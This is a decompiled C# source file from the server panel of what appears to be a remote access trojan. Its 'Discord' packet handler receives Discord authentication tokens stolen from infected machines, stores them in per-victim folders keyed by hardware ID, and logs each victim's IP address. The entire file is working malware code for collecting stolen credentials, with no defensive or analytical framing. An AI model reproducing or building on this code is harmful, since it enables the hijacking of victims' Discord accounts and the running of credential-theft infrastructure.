using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200005A RID: 90
	public class Discord
	{
		// Token: 0x060002D5 RID: 725 RVA: 0x0001E218 File Offset: 0x0001C418
		public Discord(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "DicordTokens");
				string asString = unpack_msgpack.ForcePathObject("Tokens").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllText(text + "\\DicordTokens_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" DicordTokens was saved successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ DicordTokens"
					}), Color.Purple);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no tokens", Color.MediumPurple);
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
